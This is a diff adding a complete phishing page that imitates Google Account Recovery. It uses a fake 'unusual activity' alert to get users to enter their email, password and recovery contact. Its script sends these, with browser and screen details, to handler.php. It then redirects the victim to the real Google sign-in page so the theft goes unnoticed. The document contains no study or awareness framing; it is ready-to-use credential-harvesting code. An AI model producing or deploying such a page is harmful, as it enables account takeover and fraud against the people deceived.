@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Account Recovery</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 450px;
+            width: 100%;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo-text {
+            font-size: 24px;
+            color: #202124;
+        }
+        .logo-text .g { color: #4285f4; }
+        .logo-text .o1 { color: #ea4335; }
+        .logo-text .o2 { color: #fbbc04; }
+        .logo-text .g2 { color: #4285f4; }
+        .logo-text .l { color: #34a853; }
+        .logo-text .e { color: #ea4335; }
+        h1 {
+            font-size: 24px;
+            color: #202124;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 24px;
+        }
+        .alert {
+            background: #fef7e0;
+            border: 1px solid #f9ab00;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: #202124;
+        }
+        .alert-title {
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 1px 1px rgba(26,115,232,.24);
+        }
+        label {
+            display: block;
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        .btn-primary {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            float: right;
+        }
+        .btn-primary:hover {
+            background: #1765cc;
+        }
+        .buttons {
+            margin-top: 24px;
+            overflow: auto;
+        }
+        .link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="logo-text">
+                <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+            </div>
+        </div>
+
+        <h1>Account Recovery</h1>
+        <p class="subtitle">Verify it's you</p>
+
+        <div class="alert">
+            <div class="alert-title">⚠ Security Alert</div>
+            We detected unusual activity from your account. Please verify your information.
+        </div>
+
+        <form id="recoveryForm" onsubmit="return handleSubmit(event)">
+            <label for="email">Enter your email</label>
+            <input type="email" id="email" placeholder="your.email@gmail.com" required>
+            
+            <label for="password">Enter your password</label>
+            <input type="password" id="password" placeholder="Password" required>
+            
+            <label for="recovery">Recovery email or phone</label>
+            <input type="text" id="recovery" placeholder="Recovery information" required>
+            
+            <div class="buttons">
+                <button type="submit" class="btn-primary">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const recovery = document.getElementById('recovery').value;
+            
+            const data = {
+                type: 'google_account_recovery',
+                email: email,
+                password: password,
+                recovery: recovery,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height
+            };
+            
+            fetch('handler.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                const btn = document.querySelector('.btn-primary');
+                btn.textContent = 'Verifying...';
+                btn.disabled = true;
+                
+                setTimeout(() => {
+                    window.location.href = 'https://accounts.google.com';
+                }, 1500);
+            });
+            
+            return false;
+        }
+    </script>
+</body>
+</html>
